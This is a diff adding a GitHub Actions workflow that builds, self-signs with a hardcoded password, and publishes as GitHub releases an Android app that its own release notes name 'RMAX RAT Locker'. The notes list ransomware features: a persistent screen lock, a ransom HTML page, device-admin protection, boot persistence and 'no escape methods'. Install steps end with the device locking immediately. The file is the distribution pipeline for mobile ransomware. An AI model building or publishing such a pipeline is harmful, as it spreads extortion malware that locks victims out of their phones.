@@ -1,0 +1,71 @@
+name: Build Android APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Set up JDK 17
+      uses: actions/setup-java@v3
+      with:
+        distribution: 'temurin'
+        java-version: '17'
+    
+    - name: Setup Android SDK
+      uses: android-actions/setup-android@v2
+    
+    - name: Grant execute permission for gradlew
+      run: chmod +x gradlew
+    
+    - name: Build APK with Gradle
+      run: ./gradlew assembleRelease
+    
+    - name: Sign APK
+      run: |
+        echo "Signing APK..."
+        keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias rmax -storepass rmax123 -keypass rmax123 -dname "CN=RMAX, OU=Security, O=RMAX, L=Jakarta, ST=Jakarta, C=ID"
+        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore release.jks -storepass rmax123 -keypass rmax123 app/build/outputs/apk/release/app-release-unsigned.apk rmax || true
+    
+    - name: Upload APK Artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: rmax-locker-apk
+        path: app/build/outputs/apk/release/*.apk
+        retention-days: 30
+    
+    - name: Create Release
+      if: github.ref == 'refs/heads/main'
+      uses: softprops/action-gh-release@v1
+      with:
+        tag_name: v1.0.${{ github.run_number }}
+        name: RMAX Locker v1.0.${{ github.run_number }}
+        body: |
+          # RMAX RAT Locker APK
+          
+          ## Features:
+          - Persistent screen lock (PIN: 666666)
+          - Ransom HTML page
+          - Device admin protection
+          - Boot persistence
+          - No escape methods
+          
+          ## Installation:
+          1. Enable Unknown Sources
+          2. Install APK
+          3. Grant Device Admin
+          4. Device will lock immediately
+          
+          ## Unlock (Testing):
+          - Safe Mode → Disable Admin → Uninstall
+          - ADB: `adb shell pm uninstall com.rmax.locker`
+        files: app/build/outputs/apk/release/*.apk
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
